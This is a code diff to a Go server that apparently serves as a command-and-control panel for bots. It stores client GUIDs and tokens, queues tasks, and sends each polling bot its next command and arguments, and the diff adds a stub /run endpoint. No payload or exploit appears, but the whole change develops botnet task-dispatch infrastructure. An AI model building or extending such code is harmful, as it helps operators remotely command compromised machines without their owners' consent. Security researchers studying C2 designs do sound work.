@@ -7,6 +7,7 @@ import (
 	"crypto/hmac"
 	"database/sql"
 	"encoding/json"
+	"fmt"
 	"log"
 	"net/http"
 	"strconv"
@@ -129,6 +130,7 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	var saved_guid string
 	var saved_token string
 	var saved_lastseen string
+	var saved_botid int
 	reply := common.ServerReply{
 		Args: make(map[string]any),
 	}
@@ -138,8 +140,8 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	reply.Status = 1
 	reply.TaskId = 0
 
-	sqlStr := "select guid, token, lastseen from clients where guid=?"
-	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_guid, &saved_token, &saved_lastseen)
+	sqlStr := "select id, guid, token, lastseen from clients where guid=?"
+	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen)
 	if err == sql.ErrNoRows {
 		// Can't find bot
 		log.Println("can't find bot in poll handler" + err.Error())
@@ -158,32 +160,43 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 			reply.Error = "Illegal package"
 			reply.Cmd = "poll"
 		} else {
-			// TODO FIX BUG
-			sqlStr = "select t.id as task_id, c.command, c.args" +
+			sqlStr = "select t.id as task_id, c.name, t.args" +
 				" from tasks t join commands c on t.command_id = c.id" +
-				" where t.guid = ? and t.status = 'queued' order by t.created_at asc limit 1"
+				" where t.bot_id = ? and t.status = 'queued' order by t.created_at asc limit 1"
 			saved_id := 0
 			saved_command := ""
-			saved_args := ""
-			err = db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_command, &saved_args)
+			var saved_args map[string]any
+			var bytes_args []byte
+			err = db1.QueryRow(common.Db, sqlStr, saved_botid).Scan(&saved_id, &saved_command, &bytes_args)
 			if err == sql.ErrNoRows {
 				// No such task
 				reply.Cmd = "poll"
 				reply.Status = 0
-				reply.Error = "can't find task"
+				reply.Error = "Can't find task"
 			} else if err != nil {
 				// Error in finding task
 				reply.Status = 0
 				reply.Error = "Unknown error"
 				reply.Cmd = "register"
 			} else {
-				// Find the command of task
-				reply.Cmd = saved_command
-				json.Unmarshal([]byte(saved_args), &reply.Args)
+				json.Unmarshal(bytes_args, &saved_args)
+				// Update the status of task to running
+				sqlStr = "update tasks set status='running' where id=?"
+				_, err := db1.Exec(common.Db, sqlStr, saved_id)
+				if err != nil {
+					reply.Cmd = "poll"
+					reply.Error = "Can't update task status"
+					reply.TaskId = int64(saved_id)
+					fmt.Println("[-] Failed to update status when execute task id = " + strconv.FormatInt(int64(saved_id), 10))
+				} else {
+					// Find the command of task and send to bot
+					reply.Cmd = saved_command
+					reply.Args = saved_args
+					reply.TaskId = int64(saved_id)
+				}
 			}
 		}
 	}
-
 	err = http_sender(w, guid, saved_token, &reply)
 	if err != nil {
 		log.Println(err.Error())
@@ -198,6 +211,11 @@ func login_handler(w http.ResponseWriter, r *http.Request) {
 
 }
 
+func run_handler(w http.ResponseWriter, r *http.Request) {
+	log.Println("run_handler triggered")
+
+}
+
 func Server() {
 	router := chi.NewRouter()
 
@@ -208,6 +226,7 @@ func Server() {
 	router.Post("/poll", poll_handler)
 	router.Post("/login", login_handler)
 	router.Post("/logout", logout_handler)
+	router.Post("/run", run_handler)
 
 	strPort := strconv.Itoa(common.Cfg.Server.Port)
 	log.Println("[+] Server running on " + common.Cfg.Server.Host + ":" + strPort)
